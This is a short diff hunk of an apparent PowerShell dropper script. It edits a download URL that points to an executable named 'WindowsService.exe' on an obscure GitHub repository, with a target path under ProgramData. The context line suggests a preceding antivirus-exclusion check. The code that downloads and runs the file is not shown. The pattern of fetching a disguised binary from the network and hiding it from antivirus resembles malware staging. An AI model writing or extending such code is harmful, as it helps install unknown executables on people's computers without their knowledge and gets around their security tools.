@@ -11,7 +11,7 @@ if (!$exclusionExists) {
 
 
 $filePath1 = "C:\ProgramData\SOMEEXENAME.exe"
-$url1 = "https://github.com/D3R21321/21/releases/download/jo/WindowsService.1.exe"
+$url1 = "https://github.com/D3R21321/21/releases/download/jo/WindowsService.exe"
 
 if (!(Test-Path $filePath1)) {
     Remove-Item -Path $filePath1 -Force -ErrorAction SilentlyContinue
